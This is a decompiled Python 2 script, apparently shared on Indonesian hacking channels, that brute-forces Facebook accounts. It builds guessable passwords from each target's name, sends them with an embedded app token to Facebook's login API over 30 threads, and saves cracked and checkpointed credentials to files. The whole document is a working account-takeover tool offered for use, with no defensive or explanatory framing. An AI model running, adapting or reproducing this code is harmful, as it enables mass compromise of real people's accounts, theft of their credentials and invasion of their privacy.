# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:37) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: Sumarr ID
import requests, json, sys, os, re
from multiprocessing.pool import ThreadPool as th
from datetime import datetime

class Brute:

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0

    def bruteRequest(self, username, password):
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
           'format': 'JSON', 
           'sdk_version': '2', 
           'email': username, 
           'locale': 'en_US', 
           'password': password, 
           'sdk': 'ios', 
           'generate_session_cookies': '1', 
           'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        try:
            os.mkdir('out')
        except:
            pass

        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
            self.ok.append(username + '|' + password)
            save = open('out/ok.txt', 'a')
            save.write(str(username) + '|' + str(password) + '\n')
            save.close()
            return True
        else:
            if 'www.facebook.com' in response.json()['error_msg']:
                self.cp.append(username + '|' + password)
                save = open('out/cp.txt', 'a')
                save.write(str(username) + '|' + str(password) + '\n')
                save.close()
                return True
            return False

    def brute(self, users):
        if self.setpw == False:
            self.loop += 1
            for pw in users['pw']:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[0;97m [\x1b[0;94m{}\x1b[0;97m] Crack {}/{}\x1b[0;92m OK \x1b[0;97m:\x1b[0;92m {}\x1b[0;93m CP \x1b[0;97m:\x1b[0;93m {} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                sys.stdout.write(('\r\x1b[0;97m [\x1b[0;94m{}\x1b[0;97m] Crack {}/{}\x1b[0;92m OK \x1b[0;97m:\x1b[0;92m {}\x1b[0;93m CP \x1b[0;97m:\x1b[0;93m {} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()

    def main(self):
        while True:
            file = raw_input('\x1b[0;97m [\x1b[0;94m\xe2\x80\xa2\x1b[0;97m] Contoh Dump \x1b[0;91m:\x1b[0;97m [\x1b[0;93m dump/xnxx.json\x1b[0;97m ]\n [\x1b[0;91m?\x1b[0;97m]\x1b[0;97m Output Dump\x1b[0;91m :\x1b[0;92m ')
            try:
                list = open(file, 'r').read()
                object = json.loads(list)
                break
            except IOError:
                print '\n\x1b[0;91m File\x1b[0;97m [ \x1b[0;92m%s\x1b[0;97m ]\x1b[0;91m Tidak Ada!' % file

        self.target = []
        for user in object:
            try:
                obj = user['name'].split(' ')
                if len(obj) == 1:
                    listpass = [obj[0] + '123', obj[0] + '1234',
                     obj[0] + '12345']
                elif len(obj) == 2:
                    listpass = [obj[0] + '123', obj[0] + '12345',
                     obj[1] + '123', obj[1] + '12345']
                elif len(obj) == 3:
                    listpass = [obj[0] + '123', obj[0] + '12345',
                     obj[1] + '123', obj[1] + '12345',
                     obj[2] + '123', obj[2] + '12345']
                elif len(obj) == 4:
                    listpass = [obj[0] + '123', obj[0] + '12345',
                     obj[1] + '123', obj[1] + '12345',
                     obj[2] + '123', obj[2] + '12345',
                     obj[3] + '123', obj[3] + '12345']
                else:
                    listpass = ['afghanistan', '100200',
                     '786786', '1122334455',
                     'afg123']
                self.target.append({'id': user['uid'], 'pw': listpass})
            except:
                pass

        if len(self.target) == 0:
            exit('\x1b[0;91m Id Tidak Ditemukan Dalam File\x1b[0;97m [\x1b[0;92m %s \x1b[0;97m]' % file)
        ask = raw_input('\x1b[0;97m [\x1b[0;91m?\x1b[0;97m] Password Defatuls/Manual [d/m]\x1b[0;91m :\x1b[0;92m ')
        if ask.lower() == 'm':
            while True:
                print '\n\x1b[0;97m [\x1b[0;94m\xe2\x80\xa2\x1b[0;97m] \x1b[0;97mContoh Password\x1b[0;91m: \x1b[0;92100200,100200300,786786,1122334455,afg123,afghanistan\n'
                self.setpw = raw_input('\x1b[0;97m [\x1b[0;91m?\x1b[0;97m] \x1b[0;97mMasukan Password \x1b[0;91m:\x1b[0;92m ').strip().split(',')
                if self.setpw[0] != '':
                    break

        th(30).map(self.brute, self.target)
        self.results()
        exit()

    def results(self):
        if len(self.ok) != 0:
            print '\n\n\x1b[0;92mOK \x1b[0;91m:\x1b[0;92m ' + str(len(self.ok))
            for i in self.ok:
                print '\x1b[0;92m++ ' + str(i) + ' ----> OK'

            print '\x1b[0;97mHasil OK Anda Disimpan Di \x1b[0;91m:\x1b[0;92m ok.txt'
            print '\x1b[0;92m\n\n\n Terimakasih Sudah Memakai Tools Saya Jangan Lupa\n join My telegram Channel...\n'
            os.system('xdg-open https://t.me/sultani1122')
        if len(self.cp) != 0:
            print '\n\n\x1b[0;93mCP \x1b[0;91m:\x1b[0;93m ' + str(len(self.cp))
            for i in self.cp:
                print '\x1b[0;91m++\x1b[0;93m ' + str(i) + ' ----> CP'

            print '\x1b[0;97mHasil CP Anda Disimpan Di \x1b[0;91m:\x1b[0;93m cp.txt'
            print '\x1b[0;92m\n\n\n Terimakasih Sudah Memakai Tools Saya Jangan Lupa\n Subscribe My telegram Channel...\n'
            os.system('xdg-open https://t.me/sultani1122')
        if len(self.cp) == 0 and len(self.ok) == 0:
            print '\n\x1b[0;96m Upss Kamu Tidak Mendapatkan Hasil \x1b[0;97m:(\x1b[0m'